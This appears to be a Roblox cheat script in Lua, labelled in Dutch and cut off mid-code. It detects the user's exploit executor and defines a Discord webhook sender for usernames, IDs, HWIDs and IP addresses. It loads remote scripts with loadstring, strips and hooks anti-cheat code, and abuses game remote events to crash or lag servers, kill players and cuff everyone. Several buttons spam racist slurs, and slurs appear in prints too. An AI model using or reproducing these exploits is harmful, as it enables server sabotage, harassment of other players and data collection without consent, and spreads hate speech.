print([[                       
                       :::!~!!!!!:.
                  .xUHWH!! !!?M88WHX:.
                .X*#M@$!!  !X!M$$$$$$WWx:.
               :!!!!!!?H! :!$!$$$$$$$$$$8X:
              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
               !:~~~ .:!M"T#$$$$WX??#MRRMMM!
               ~?WuxiW*`   `"#$$$$8!!!!??!!!
             :X- M$$$$       `"T#$T~!8$WUXU~
            :%`  ~#$$$m:        ~!~ ?$$$$$$
          :!`.   ~T$$$$8xx.  .xWW- ~""##*"
.....   -~~:<` !    ~?T#$$@@W@*?$$      /`
W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
 #"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
$R@i.~~ !     :   ~$$$$$B$$en:``
?MXT@Wx.~    :     ~"##*$$$$M~
]])

--// Services

-- Executor Detection
local function detectExecutor()
    if syn then return "Synapse X" end
    if secure_load then return "Sentinel" end
    if pebc_execute then return "ProtoSmasher" end
    if KRNL_LOADED then return "Krnl" end
    if is_sirhurt_closure then return "SirHurt" end
    if identifyexecutor then
        local s, r = pcall(identifyexecutor)
        if s and r then return r end
    end
    if _G.fluxus then return "Fluxus" end
    if _G.delta then return "Delta" end
    if _G.WRD_DEBUG or _G.WEAREDEVS then return "WeAreDevs (WRD)" end
    if _G.oxygenU then return "Oxygen U" end
    if _G.scriptware then return "Script-Ware" end
    if get_luavm_flags then return "Script-Ware (Alt)" end
    if _G.JJSploit then return "JJSploit" end
    if _G.Celestial then return "Celestial" end
    if _G.Protosmasher then return "ProtoSmasher (Alt)" end
    if _G.Vega then return "Vega X" end
    if _G.Hydrogen then return "Hydrogen" end
    if _G.Arcade then return "Arcade" end
    if _G.Shadow then return "Shadow" end
    if _G.Potassium then return "Potassium" end
    local ok, env = pcall(getrenv)
    if ok and env and (env.Potassium or env.executorName == "Potassium") then return "Potassium" end
    if gethiddenproperty or sethiddenproperty then return "Unknown (HiddenProp)" end
    if getrawmetatable or setrawmetatable then return "Unknown (Metatable)" end
    if newcclosure or islclosure then return "Unknown (CClosure)" end
    if hookfunction then return "Unknown (Hook)" end
    if protect_gui or protect_script then return "Unknown (Protect API)" end
    if getconnections then return "Unknown (Connections)" end
    if getgenv then return "Unknown (getgenv)" end
    if getfenv and getfenv(0) and getfenv(0).setclipboard then return "Unknown (Clipboard)" end
    if HttpGet or HttpPost then return "Unknown (HTTP)" end
    return "Unknown"
end

-- Blacklist
local blacklistedHWIDs = {
    ["abc123"] = true,
    ["def456"] = true,
    ["spoofedhackerID"] = true,
}

local function isBlacklisted()
    if blacklistedHWIDs[HWID] then
        warn("Blacklisted HWID: " .. HWID)
        LocalPlayer:Kick("je HWID staat op blacklist dusss ermmmmm")
        return true
    end
    return false
end

-- Webhook Builder
local function createWebhookData()
    local executor = detectExecutor()
    local data = {
        embeds = {{
            title = "NigeriaExploit",
            description = string.format(
                "**Username:** %s\n**Display Name:** %s\n**User ID:** %d\n**HWID:** `%s`\n**Game:** %s\n**Exploit:** %s\n**IP:** %s\n",
                Username, DisplayName, UserId, HWID, GameName, executor, GetIp
            ),
            thumbnail = {
                url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. UserId .. "&width=150&height=150&format=png"
            },
            color = 16753920,
            footer = { text = os.date("Logged at %Y-%m-%d %H:%M:%S") }
        }}
    }
    return HttpService:JSONEncode(data)
end

-- Webhook Sender
local function sendWebhook(url, data)
    local headers = {["Content-Type"] = "application/json"}
    local requestFunc = http_request or request or (syn and syn.request)
    if requestFunc then
        requestFunc({
            Url = url,
            Method = "POST",
            Headers = headers,
            Body = data
        })
    else
        warn("❌ No supported HTTP request method found.")
    end
end

-- Webhook URL
local webhookUrl = "https://discordapp.com/api/webhooks/1392498264451842139/aaO4ISZQOkYYaqVvxlh2ZFw2oocBGO4PBaa-oRD_mODb9hZTn5o54av-G9k1S9rkOv1M"

print("Made By trex.gg en eclipse")
local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
local Window = Rayfield:CreateWindow({
   Name = "NigeriaExploit",
   Icon = 0, -- Icon in Topbar. Can use Lucide Icons (string) or Roblox Image (number). 0 to use no icon (default).
   LoadingTitle = "Rayfield Interface Suite",
   LoadingSubtitle = "by trex.gg & Eclipse",
   ShowText = "Exploits", -- for mobile users to unhide rayfield, change if you'd like
   Theme = "Amethyst", -- Check https://docs.sirius.menu/rayfield/configuration/themes

   ToggleUIKeybind = "K", -- The keybind to toggle the UI visibility (string like "K" or Enum.KeyCode)

   DisableRayfieldPrompts = false,
   DisableBuildWarnings = false, -- Prevents Rayfield from warning when the script has a version mismatch with the interface

   ConfigurationSaving = {
      Enabled = true,
      FolderName = nil, -- Create a custom folder for your hub/game
      FileName = "gimaa"
   },

   Discord = {
      Enabled = false, -- Prompt the user to join your Discord server if their executor supports it
      Invite = "noinvitelink", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ ABCD would be ABCD
      RememberJoins = true -- Set this to false to make them join the discord every time they load it up
   },

   KeySystem = true, -- Set this to true to use our key system
   KeySettings = {
      Title = "Untitled",
      Subtitle = "Key System",
      Note = "No method of obtaining the key is provided", -- Use this to tell the user how to get a key
      FileName = "Key", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
      SaveKey = true, -- The user's key will be saved, but if you change the key, they will be unable to use your script
      GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
      Key = {"Onbekende Gebruiker"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
   }
})




local Universeel = Window:CreateTab("Universeel", 4483362458) -- Title, Image

local KnopUnviverseel1 = Universeel:CreateButton({
    Name = "God Mode (Werkt niet in alle games en niet in de greenzone staan)",
    Callback = function()


    local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    local rootPart = character:FindFirstChild("HumanoidRootPart")

    if not humanoid or not rootPart then
        warn("No Humanoid or HumanoidRootPart found!")
        return
    end

    -- ✅ Show black screen immediately
    local playerGui = player:WaitForChild("PlayerGui")
    if playerGui:FindFirstChild("BlackScreen") then
        playerGui.BlackScreen:Destroy()
    end

    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "BlackScreen"
    screenGui.IgnoreGuiInset = true
    screenGui.Enabled = true
    screenGui.Parent = playerGui

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(1, 0, 1, 0)
    frame.Position = UDim2.new(0, 0, 0, 0)
    frame.BackgroundColor3 = Color3.new(0, 0, 0)
    frame.Parent = screenGui

    local textLabel = Instance.new("TextLabel")
    textLabel.Text = "made by trex.gg ; ) " .. game.Name .. " is shitty"
    textLabel.Size = UDim2.new(0, 200, 0, 100)
    textLabel.AnchorPoint = Vector2.new(0.5, 0.5)
    textLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
    textLabel.BackgroundTransparency = 1
    textLabel.TextColor3 = Color3.new(1, 1, 1)
    textLabel.TextScaled = true
    textLabel.Font = Enum.Font.SourceSansBold
    textLabel.Parent = frame

    -- Remove black screen after 3 seconds


    -- ✅ Save original position
    local originalCFrame = rootPart.CFrame

    -- ✅ Give God Mode
    -- (No implementation provided, so skipping)

    -- ✅ TP to Safe Zone (corrected name)
    local safeZone = workspace:FindFirstChild("Safe Zone") or workspace:FindFirstChild("SafeZone") or workspace.Greenzones.Zone
    if safeZone and safeZone:IsA("BasePart") then
        character:PivotTo(safeZone.CFrame + Vector3.new(0, 5, 0))
    else
        warn("No SafeZone found in workspace!")
        textLabel.Text = "Geen Safe Zone gevonden in de workspace!"
    end

    -- ✅ Wait a moment in Safe Zone
    task.wait(2)

    -- ✅ TP to Seat (try both seats if available)
local seats = {}
for _, obj in pairs(workspace:GetDescendants()) do
    if obj:IsA("Seat") or obj:IsA("VehicleSeat") then
        table.insert(seats, obj)
        textLabel.Text = "Modules Gevonden: " .. tostring(#seats)
    end
end

    local seated = false
    for i, seat in seats do
        if seat and seat:IsA("BasePart") then
            local seatOffset = Vector3.new(0, seat.Size.Y/2 + humanoid.HipHeight, 0)
            character:PivotTo(seat.CFrame + seatOffset)
            task.wait(0.1)
            humanoid.Sit = true
            -- Check if humanoid is actually sitting in the seat
            task.wait(0.2)
            if humanoid.SeatPart == seat then
                seated = true
                break
            end
        end
    end

    if not seated then
        warn("No available Modules found in workspace!")
        textLabel.Text = "Geen beschikbare Module gevonden in de workspace!"
    end

    -- ✅ Wait a moment in Seat
    task.wait(2)

    -- ✅ TP back to original position
    if character and character.Parent then
        character:PivotTo(originalCFrame)
        humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
        wait(1)
        screenGui:Destroy()

    end

loadstring(game:HttpGet("https://github.com/exxtremestuffs/SimpleSpySource/raw/master/SimpleSpy.lua"))()
    -- made by trex.gg

    end,
})
        
local KnopUnviverseel2 = Universeel:CreateButton({
    Name = "SaveInstance",
    Callback = function()
local Params = {
    RepoURL = "https://raw.githubusercontent.com/luau/SynSaveInstance/main/",
    SSI = "saveinstance",
}
local synsaveinstance = loadstring(game:HttpGet(Params.RepoURL .. Params.SSI .. ".luau", true), Params.SSI)()
local Options = {} -- Documentation here https://luau.github.io/UniversalSynSaveInstance/api/SynSaveInstance
synsaveinstance(Options)

    end,
})
local KnopUnviverseel3 = Universeel:CreateButton({
    Name = "RSPY",
    Callback = function()

loadstring(game:HttpGet("https://github.com/exxtremestuffs/SimpleSpySource/raw/master/SimpleSpy.lua"))()
    
    end,
})

local KnopUnviverseel4 = Universeel:CreateButton({
    Name = "Anti Cheat Destroyer",
    Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Pixeluted/adoniscries/main/Source.lua",true))()
wait(0.5)
loadstring(game:HttpGet("https://raw.githubusercontent.com/0XXXMAXXX0/adonisremover/refs/heads/main/source"))()
wait(0.5)
local LocalPlayer = game.Players.LocalPlayer
local oldhmmi
    oldhmmi = hookmetamethod(game, "__index", function(self, method)
        if self == LocalPlayer and method:lower() == "kick" then
            return error("Expected ':' not '.' calling member function Kick", 2)
        end
        return oldhmmi(self, method)
    end)
local oldhmmnc
    oldhmmnc = hookmetamethod(game, "__namecall", function(self, ...)
        if self == LocalPlayer and getnamecallmethod():lower() == "kick" then
            return
        end
        return oldhmmnc(self, ...)
    end)

local StarterGui = game:GetService("StarterGui")
wait(0.5)
local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local StarterPlayer = game:GetService("StarterPlayer")

local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local charModel = workspace:FindFirstChild(character.Name) or character

local s1Script = charModel and charModel:FindFirstChild("ACS_Client")
local s2Script = charModel and charModel:FindFirstChild("MedSys")
local Slocks1 = charModel and charModel:FindFirstChild("AntiExploit")
local Slocks2 = charModel and charModel:FindFirstChild("checkScript")
local Slocksreal1 = charModel and charModel:FindFirstChild("MedSys")
local lwd = charModel and charModel:FindFirstChild("64858389")
local lwd2 = charModel and charModel:FindFirstChild("69325370")
local lwd3 = charModel and character:FindFirstChild("[SCRIPTS]") and character["[SCRIPTS]"].Walkspeed

-- Safely get Apeldoorn scripts without errors
local function safeFind(path)
    local current = path[1]
    for i = 2, #path do
        if current then
            current = current:FindFirstChild(path[i])
        else
            return nil
        end
    end
    return current
end

local Apeldoorn2 = safeFind({StarterPlayer, "StarterPlayerScripts", "Assets", "Scripts", "AClient"})
local Apeldoorn = safeFind({player, "PlayerScripts", "Assets", "Scripts", "AClient"})

local function notifycorrect(title, text)
    StarterGui:SetCore("SendNotification", {
        Title = title,
        Text = text,
        Icon = "rbxassetid://505845268",
        Duration = 5,
        Button1 = "Is goed"
    })
end

local function notifyincorrect(title, text)
    StarterGui:SetCore("SendNotification", {
        Title = title,
        Text = text,
        Icon = "rbxassetid://104917074710498",
        Duration = 5,
        Button1 = "Is goed"
    })
end

local detectedSomething = false

-- Check and remove s1Script or Slocks1
if s1Script then
    s1Script:Destroy()
    notifycorrect("Anti Cheat Bypasser", "FiveR/Emergency Amsterdam Gedetecteerd Anti Cheats Verwijderd")
    detectedSomething = true
elseif Slocks1 then
    Slocks1:Destroy()
    notifycorrect("Anti Cheat Bypasser", "Sloks Roleplay Nep Gedetecteerd Anti Cheats Verwijderd")
    detectedSomething = true
end

if game.PlaceId == 4520619420 then 

    notifycorrect("Anti Cheat Bypasser", "Leeuwarden is tijdelijk offline ! Dus je kan bepaalde dingen niet doen ; ) ")

end

-- Check and remove Apeldoorn scripts
if Apeldoorn or Apeldoorn2 then
    if Apeldoorn then
        Apeldoorn:Destroy()
    end
    if Apeldoorn2 then
        Apeldoorn2:Destroy()
    end
    notifycorrect("Anti Cheat Bypasser", "Apeldoorn Gedetecteerd Anti Cheats Verwijderd")
    detectedSomething = true
end

-- Check and remove Slocksreal1
if Slocksreal1 then
    Slocksreal1:Destroy()
    notifycorrect("Anti Cheat Bypasser", "Sloks Roleplay Echt Gedetecteerd Anti Cheats Verwijderd")
    detectedSomething = true
end

-- Check and remove s2Script or Slocks2
if s2Script then
    s2Script:Destroy()
    detectedSomething = true
elseif Slocks2 then
    Slocks2:Destroy()
    detectedSomething = true
else
    warn("No MedSys or checkScript scripts found in character")
end

if not detectedSomething then
    notifyincorrect("Anti Cheat Bypasser", "Geen Anti-Cheat Gedetecteerd")
end


    
    end,
})
    
local KnopUniverseel5 = Universeel:CreateButton({
    Name = "Dex",
    Callback = function()
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/infyiff/backup/main/dex.lua'), true))()
    end,
})
local KnopUniverseel6 = Universeel:CreateButton({
    Name = "Infinite Yield",
    Callback = function()
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/edgeiy/infiniteyield/master/source'), true))()
    end,
})

local KnopUnviverseel7 = Universeel:CreateButton({
    Name = "Reload Script",
    Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/0XXXMAXXX0/sgibodmrjbgidislootiudsughxehgisdigksoogejfihgisktsugiosoemhbdhu/refs/heads/main/lua"))()
    end,
})

local KnopUnviverseel8 = Universeel:CreateButton({
    Name = "Aimbot (ESP met Infn Yield)",
    Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Exunys/Aimbot-V3/main/src/Aimbot.lua"))()()
    end,
})

local ACS = Window:CreateTab("ACS 1.7.5", 4483362458) -- Title, Image

local ACSKnop1 = ACS:CreateButton({
    Name = "Bypass Building Cooldown",
    Callback = function()
        game:GetService('ReplicatedStorage')['ACS_Engine'].Eventos.Recarregar:FireServer(9999999,{ACS_Modulo={Variaveis={StoredAmmo = game.Players.LocalPlayer.Character.ACS_Client.Kit.Fortifications}}})
    end,
})

local ACSKnop2 = ACS:CreateButton({
    Name = "HEAL",
    Callback = function()
        game:GetService('ReplicatedStorage')['ACS_Engine'].Eventos.Damage:FireServer(game.Players.LocalPlayer.Character.Humanoid, -50, 0, 0)
    end,
})

local ACSKnop3 = ACS:CreateButton({
    Name = "KILL",
    Callback = function()
        game:GetService('ReplicatedStorage')['ACS_Engine'].Eventos.Damage:FireServer(game.Players.LocalPlayer.Character.Humanoid, math.huge, 0, 0)
    end,
})

local ACSKnop4 = ACS:CreateButton({
    Name = "BLOKKEN MAP",
    Callback = function()
        local cFrame = CFrame.new(0,0,0)
        local Size = {
          X = 1000000000000000000000000000000000000,
          Y = 100000000000000000000000000000000000,
          Z = 10000000000000000000000000000000000
        }
        game:GetService('ReplicatedStorage')['ACS_Engine'].Eventos.Breach:FireServer(3,{Fortified={},Destroyable=workspace},CFrame.new(),CFrame.new(),{CFrame=game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame*cFrame,Size=Size})
    end,
})

local ACSKnop5 = ACS:CreateButton({
    Name = "LAG SERVER",
    Callback = function()
        game:GetService('ReplicatedStorage')['ACS_Engine'].Eventos.Breach:FireServer(3,{Fortified={},Destroyable=workspace},CFrame.new(),CFrame.new(),{CFrame={},Size={}})
    end,
})

local ACSKnop6 = ACS:CreateButton({
    Name = "SUPRESS SERVER",
    Callback = function()
        while task.wait() do
           for _, player in next, game.Players:GetPlayers() do
              game:GetService('ReplicatedStorage')['ACS_Engine'].Eventos.Suppression:FireServer(player, 666, 666, 666)
           end
        end
    end,
})

local ACSKnop7 = ACS:CreateButton({
    Name = "GOD MODE",
    Callback = function()
        game:GetService('ReplicatedStorage')['ACS_Engine'].Eventos.Damage:FireServer(game.Players.LocalPlayer.Character.Humanoid, -math.huge, 0, 0)
    end,
})

local ACSKnop8 = ACS:CreateButton({
    Name = "WHIZZ SERVER",
    Callback = function()
        while task.wait() do
           for _, player in next, game.Players:GetPlayers() do
               game:GetService('ReplicatedStorage')['ACS_Engine'].Eventos.Whizz:FireServer(player)
           end
        end
    end,
})

local ACSKnop9 = ACS:CreateButton({
    Name = "VALUE CHANGER",
    Callback = function()
        local value = game.Players.LocalPlayer.Character.Saude.Variaveis.MLs
        game:GetService('ReplicatedStorage')['ACS_Engine'].Eventos.Recarregar:FireServer(1,{ACS_Modulo={Variaveis={StoredAmmo = value}}})
    end,
})

local ACSKnop10 = ACS:CreateButton({
    Name = "CRASH SERVER",
    Callback = function()
        while task.wait() do
           for i = 1, 30 do
               game:GetService('ReplicatedStorage')['ACS_Engine'].Eventos.ServerBullet:FireServer(Vector3.new(0/0/0),Vector3.new(0/0/0))
           end
        end
    end,
})

local ACS2 = Window:CreateTab("ACS 2.0.1", 4483362458) -- Title, Image

local ACS2Knop1 = ACS2:CreateButton({
    Name = "BYPASS BUILDING COOLDOWN",
    Callback = function()
        game:GetService('ReplicatedStorage').ACS_Engine.Events.Refil:FireServer(game.Players.LocalPlayer.Character.ACS_Client.Kit.Fortifications, -99999999)
    end,
})

local ACS2Knop2 = ACS2:CreateButton({
    Name = "NO FALL DAMAGE",
    Callback = function()
        local cfg = require(game:GetService('ReplicatedStorage')['ACS_Engine'].GameRules.Config)
        cfg.EnableFallDamage = false
    end,
})

local ACS2Knop3 = ACS2:CreateButton({
    Name = "WHIZZ SERVER",
    Callback = function()
        while task.wait() do
            for _, player in next, game.Players:GetPlayers() do
                game:GetService('ReplicatedStorage')['ACS_Engine'].Events.Whizz:FireServer(player)
            end
        end
    end,
})

local ACS2Knop4 = ACS2:CreateButton({
    Name = "CRASH SERVER",
    Callback = function()
        while task.wait() do
            for _, player in next, game.Players:GetPlayers() do
                game:GetService("ReplicatedStorage")["ACS_Engine"].Events.Suppression:FireServer(player, 666, 666, 666)
            end
        end
    end,
})

local ACS2Knop5 = ACS2:CreateButton({
    Name = "BLOKKEN MAP",
    Callback = function()
        local cFrame = CFrame.new(0,0,0)
        local Size = {
          X = 1000000000000000000000000000000000000,
          Y = 100000000000000000000000000000000000,
          Z = 10000000000000000000000000000000000
        }
        game:GetService('ReplicatedStorage')['ACS_Engine'].Eventos.Breach:InvokeServer(3,{Fortified={},Destroyable=workspace},CFrame.new(),CFrame.new(),{CFrame=game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame*cFrame,Size=Size})
    end,
})

local ACS2Knop6 = ACS2:CreateButton({
    Name = "VALUE CHANGER",
    Callback = function()
        game:GetService('ReplicatedStorage')['ACS_Engine'].Events.Refil:FireServer(game:GetService('Workspace')['virtual_rod']['ACS_Client'].Protecao.VestProtect.Value, 999)
    end,
})

local ACS2Knop7 = ACS2:CreateButton({
    Name = "INFINITE STAMINA",
    Callback = function()
        local cfg = require(game:GetService('ReplicatedStorage')['ACS_Engine'].GameRules.Config)
        cfg.EnableStamina = false
    end,
})

local ACS2Knop8 = ACS2:CreateButton({
    Name = "NO JUMP COOLDOWN",
    Callback = function()
        local cfg = require(game:GetService('ReplicatedStorage')['ACS_Engine'].GameRules.Config)
        cfg.AntiBunnyHop = false
    end,
})



local ZuidStad = Window:CreateTab("Zuidstad Roleplay", 0) -- Title, Image
local ZuidStadKnop1 = ZuidStad:CreateButton({
    Name = "Geld Panel",
    Callback = function()
        local player = game.Players.LocalPlayer
        local panel = player:WaitForChild("PlayerGui"):WaitForChild("FRP-Admin")
        panel.TextLabel.Text = "geld paneltje credits aan papi eclipse en trex 😉"
        panel.TextLabel.BackgroundColor3 = Color3.fromRGB(22, 59, 120)
        local uiCorner = Instance.new("UICorner")
        uiCorner.Parent = panel.TextLabel
        if panel:FindFirstChild("Template2") and panel.Template2:FindFirstChild("ImageLabel") then
            panel.Template2.ImageLabel.Image = "rbxassetid://121404854010268"
        end
        panel.Enabled = true
        print("Credits: Eclipse, trex.gg, en PJ (sigma)")
    end,
})
local ZuidStadKnop2 = ZuidStad:CreateButton({
    Name = "Kill All (eclipse)",
    Callback = function()
    loadstring(game:HttpGet("https://pastebin.com/raw/EkbDeTiF"))()
    end,
})

local Apeldoorn = Window:CreateTab("Apeldoorn Roleplay", 0) -- Title, Image
local ApeldoornKnop1 = Apeldoorn:CreateButton({
    Name = "Blinddoek All",
    Callback = function()
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

for _, player in pairs(Players:GetPlayers()) do
    if player ~= LocalPlayer and player.Character then
        local args = {
            player.Character
        }
        LocalPlayer.Character:WaitForChild("Blinddoek"):WaitForChild("RemoteEvent"):FireServer(unpack(args))
    end
end
    end,
})
local ApeldoornKnop2 = Apeldoorn:CreateButton({
    Name = "Revive",
    Callback = function()
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer or Players.PlayerAdded:Wait()
local function getCharacterAndHRP()
    local character = player.Character or player.CharacterAdded:Wait()
    local hrp = character:WaitForChild("HumanoidRootPart")
    return character, hrp
end
local _, hrp = getCharacterAndHRP()
local originalPos = hrp.Position
loadstring(game:HttpGet("https://pastebin.com/raw/X5gyhQXw"))()
local newCharacter = player.Character or player.CharacterAdded:Wait()
player.CharacterAdded:Wait()
task.wait(1.5)
local args = {
    "Info",
    "Kankerdoorn Roleplay",
    "trex.gg Eclipse en pj hebben je gereboot welkom terug in de game"
}
ReplicatedStorage:WaitForChild("Assets"):WaitForChild("Events"):WaitForChild("Notify"):FireServer(unpack(args))
local _, newHRP = getCharacterAndHRP()
newHRP.CFrame = CFrame.new(originalPos)
print("Credits: Eclipse, trex.gg, en PJ (sigma)")

    end,
})
local ApeldoornKnop3 = Apeldoorn:CreateButton({
    Name = "Twitter Spam",
    Callback = function()
local player = game:GetService("Players").LocalPlayer
local telefoon = player:WaitForChild("PlayerGui"):WaitForChild("Telefoon")
local events = telefoon:WaitForChild("Events")
local accessId = events:WaitForChild("AcessId"):InvokeServer(player.UserId)
local arg = {
    Message = "APELDOORN FIX JE KANKER ANTI CHEAT KANKER NEGERS", 
    Security = accessId .. "-" .. player.UserId
}

local general = events:WaitForChild("General")
while true do
general:InvokeServer("Twitter", arg)
general:InvokeServer("Twitter", arg)
general:InvokeServer("Twitter", arg)
wait(2.2)
end
        print("Credits: Eclipse, trex.gg, en PJ (sigma)")
    end,
})
local ApeldoornKnop4 = Apeldoorn:CreateButton({
    Name = "TP BlackMarket",
    Callback = function()
local player = game.Players.LocalPlayer
local playerGui = player.PlayerGui
local part = workspace.Apeldoorn.Overig.OUD.Map.Blackmarket.Part
if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
local screenGui = Instance.new("ScreenGui")
	screenGui.Name = "BlackScreen"
	screenGui.IgnoreGuiInset = true
	screenGui.Enabled = true
	screenGui.Parent = playerGui
	local frame = Instance.new("Frame")
	frame.Size = UDim2.new(1, 0, 1, 0)
	frame.Position = UDim2.new(0, 0, 0, 0)
	frame.BackgroundColor3 = Color3.new(0, 0, 0)
	frame.Parent = screenGui
	local textLabel = Instance.new("TextLabel")
	textLabel.Text = "made by trex.gg ; ) apeldoorn is shitty"
	textLabel.Size = UDim2.new(0, 200, 0, 100)
	textLabel.AnchorPoint = Vector2.new(0.5, 0.5)
	textLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
	textLabel.BackgroundTransparency = 1
	textLabel.TextColor3 = Color3.new(1, 1, 1)
	textLabel.TextScaled = true
	textLabel.Font = Enum.Font.SourceSansBold
	textLabel.Parent = frame
    player.Character.HumanoidRootPart.CFrame = part.CFrame + Vector3.new(0, 5, 0)
    print("tpd blackniggerdw")
	wait(1)
	player.PlayerGui.BlackScreen:Destroy()
else
local screenGui = Instance.new("ScreenGui")
	screenGui.Name = "BlackScreen"
	screenGui.IgnoreGuiInset = true
	screenGui.Enabled = true
	screenGui.Parent = playerGui

	local frame = Instance.new("Frame")
	frame.Size = UDim2.new(1, 0, 1, 0)
	frame.Position = UDim2.new(0, 0, 0, 0)
	frame.BackgroundColor3 = Color3.new(0, 0, 0)
	frame.Parent = screenGui

	local textLabel = Instance.new("TextLabel")
	textLabel.Text = "Geen BlackMarket Gevonden dm trex.gg"
	textLabel.Size = UDim2.new(0, 200, 0, 100)
	textLabel.AnchorPoint = Vector2.new(0.5, 0.5)
	textLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
	textLabel.BackgroundTransparency = 1
	textLabel.TextColor3 = Color3.new(1, 1, 1)
	textLabel.TextScaled = true
	textLabel.Font = Enum.Font.SourceSansBold
	textLabel.Parent = frame
    wait(2)
	player.PlayerGui.BlackScreen:Destroy()
    warn("Character or HumanoidRootPart nie gevonden!")
end
    end,
})

local ApeldoornKnop5 = Apeldoorn:CreateButton({
    Name = "Cuff Others",
    Callback = function()
local player = game.Players.LocalPlayer

for _, otherPlayer in ipairs(game.Players:GetPlayers()) do
	if otherPlayer ~= player then
		local args = {
			otherPlayer.Name, -- dynamically use their name
			"Arresteren"
		}
		game:GetService("ReplicatedStorage"):WaitForChild("Handcuffs"):FireServer(unpack(args))
	end
end

    end,
})



local FiveR = Window:CreateTab("FiveR", 0) -- Title, Image
local FiverKnop1 = FiveR:CreateButton({
    Name = "Twitter Spam",
    Callback = function()
    local args = {
	"dikke zwarte negertjes en fix jullie anti cheat"
}
while true do 
game:GetService("ReplicatedStorage"):WaitForChild("TwitterPost"):FireServer(unpack(args))
    wait(0.1)
end

    end,
})
local FiverKnop2 = FiveR:CreateButton({
    Name = "Noodknop Spam",
    Callback = function()
    local args = {
	"dikke zwarte negertjes en fix jullie anti cheat"
}
while true do 
game:GetService("ReplicatedStorage"):WaitForChild("TwitterPost"):FireServer(unpack(args))
    wait(0.1)
end

    end,
})

local FiverKnop3 = FiveR:CreateButton({
    Name = "Cuff All",
    Callback = function()
local Players = game:GetService("Players")
local lp = Players.LocalPlayer
local char = lp.Character or lp.CharacterAdded:Wait()
local hrp = char:WaitForChild("HumanoidRootPart")
local humanoid = char:FindFirstChildOfClass("Humanoid")
	local chr = plr.Character or plr.CharacterAdded:Wait()
	local hum = chr:WaitForChild("Humanoid")
local originalCFrame = hrp.CFrame

-- Create black screen GUI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "BlackScreen"
screenGui.ResetOnSpawn = false
screenGui.Enabled = true
screenGui.IgnoreGuiInset = true
screenGui.Parent = lp:WaitForChild("PlayerGui")

local blackFrame = Instance.new("Frame")
blackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
blackFrame.Size = UDim2.new(1, 0, 1, 0)
blackFrame.Position = UDim2.new(0, 0, 0, 0)
blackFrame.Parent = screenGui

local textLabel = Instance.new("TextLabel")
textLabel.Text = "gemaakt door trex.gg iedereen aan het cuffen (ligt aan mods maar je kan missschien gekickt worden.)"
textLabel.TextColor3 = Color3.new(1, 1, 1)
textLabel.BackgroundTransparency = 1
textLabel.Size = UDim2.new(0.5, 0, 0, 50)
textLabel.Position = UDim2.new(0.25, 0, 0.5, -25)
textLabel.Font = Enum.Font.SourceSansBold
textLabel.TextScaled = true
textLabel.Parent = blackFrame

-- Function to remove the black screen after the process
local function removeBlackScreen()
    screenGui:Destroy()
end

-- Perform the proximity prompt firing logic
for _, player in ipairs(Players:GetPlayers()) do
    if player ~= lp and player.Character then
        local targetChar = player.Character
        local targetHRP = targetChar:FindFirstChild("HumanoidRootPart")
        if targetHRP then
            local prompt = targetHRP:FindFirstChild("Handboeienpromp")
            if prompt and prompt:IsA("ProximityPrompt") then
                pcall(function()
                    -- Move close to the target
                    hrp.CFrame = targetHRP.CFrame + Vector3.new(0, 0, -1)
                    if humanoid then humanoid:Move(Vector3.zero) end
                    hrp.CFrame = CFrame.new(hrp.Position, targetHRP.Position)

                    -- Fire repeatedly until prompt is gone or disabled
                    while prompt and prompt:IsDescendantOf(game) and prompt.Enabled do
                        fireproximityprompt(prompt, 1, true)
							local plr = game:GetService("Players").LocalPlayer
		hum:ChangeState(Enum.HumanoidStateType.Jumping) -- you can do hum:ChangeState(3) too
	
                        wait(0.5) -- Slight delay between attempts
                    end
                end)
            end
        end
    end
end

-- Return to original position
hrp.CFrame = originalCFrame

-- Remove the black screen once the task is complete
removeBlackScreen()

    end,
})

local Leeuwarden = Window:CreateTab("Leeuwarden", 0) -- Title, Image
local LeeuwardenKnop1 = Leeuwarden:CreateButton({
    Name = "AutoFarm Materialen (Niet bewegen Niks doen gewoon wachten tot klaar)",
    Callback = function()
    local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local camera = workspace.CurrentCamera
local stelenFolder = workspace:WaitForChild("Stelen")

-- Create black screen GUI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "BlackScreen"
screenGui.ResetOnSpawn = false
screenGui.Enabled = true
screenGui.IgnoreGuiInset = true
screenGui.Parent = player:WaitForChild("PlayerGui")

